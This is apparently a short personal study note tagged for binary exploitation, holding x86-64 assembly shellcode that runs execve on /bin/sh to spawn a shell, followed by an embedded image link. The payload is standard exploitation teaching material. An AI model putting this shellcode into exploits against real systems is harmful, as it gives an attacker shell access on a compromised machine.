---
tags:
  - binary_exploitation
---

```c
.intel_syntax noprefix
.global _start
_start:
mov rax, 59
lea rdi, [rip+binsh]
mov rsi,0
mov rdx,0
syscall
binsh:
.string "/bin/sh"
```
![[Shellcode For Bash Shell-20250208010052393.webp]]